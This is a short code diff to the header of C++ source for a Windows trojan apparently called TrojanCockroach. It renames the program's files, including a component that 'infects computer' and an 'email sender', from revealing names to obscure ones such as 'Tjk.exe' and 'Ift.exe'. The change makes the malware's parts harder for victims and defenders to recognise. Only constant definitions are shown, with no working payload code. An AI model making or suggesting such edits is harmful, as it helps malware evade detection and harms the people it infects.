@@ -1,9 +1,9 @@
-#define FOLDER_NAME "trojanCockroach"  //containing folder
-#define RUN_FILE_NAME "TrojanCockroach.exe"  //main run file
-#define RUN_LINK_NAME "TrojanCockroach.lnk"  //starter link
-#define INFECT_FILE_NAME "Infect.exe"  //infects computer
-#define INFECT_LINK_NAME "Infect.lnk"  //link file
-#define EMAIL_SENDER_FILE_NAME "Transmit.exe"  //email sender
+#define FOLDER_NAME "tjk"  //containing folder
+#define RUN_FILE_NAME "Tjk.exe"  //main run file
+#define RUN_LINK_NAME "Tjk.lnk"  //starter link
+#define INFECT_FILE_NAME "Ift.exe"  //infects computer
+#define INFECT_LINK_NAME "Ift.lnk"  //link file
+#define EMAIL_SENDER_FILE_NAME "Trmst.exe"  //email sender
 
 #include <windows.h>
 #include <string>
